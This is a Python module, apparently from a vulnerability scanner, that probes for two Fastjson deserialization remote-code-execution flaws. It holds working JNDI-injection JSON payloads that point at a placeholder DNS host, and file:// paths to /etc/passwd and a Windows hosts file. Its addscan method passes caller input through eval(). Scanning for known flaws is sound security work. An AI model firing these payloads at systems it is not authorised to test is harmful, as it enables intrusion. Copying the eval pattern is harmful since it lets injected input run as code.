#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    Fastjson扫描类: 
        1. Fastjson <=1.2.47 反序列化 (远程代码执行)
            CNVD-2019-22238
            
        2. Fastjson <= 1.2.24 反序列化 (远程代码执行)
            CNVD-2017-02833
            CVE-2017-18349

file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.thread import thread
from payloads.Fastjson.cnvd_2017_02833 import cnvd_2017_02833_scan
from payloads.Fastjson.cnvd_2019_22238 import cnvd_2019_22238_scan

class Fastjson():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Fastjson'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cnvd_2019_22238_payloads = [
            {
                'path': '',
                'data': '''{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"dns://dnsdomain/Cat",
        "autoCommit":true
    }
}'''
            }
        ]

        self.cnvd_2017_02833_payloads = [
            {
                'path': '',
                'data': '''{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"dns://dnsdomain/Cat",
        "autoCommit":true
    }
}'''
            }
        ]
    
    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cnvd_2017_02833_scan, url=url),
            thread(target=self.cnvd_2019_22238_scan, url=url),
        ]

Fastjson.cnvd_2017_02833_scan = cnvd_2017_02833_scan
Fastjson.cnvd_2019_22238_scan = cnvd_2019_22238_scan

fastjson = Fastjson()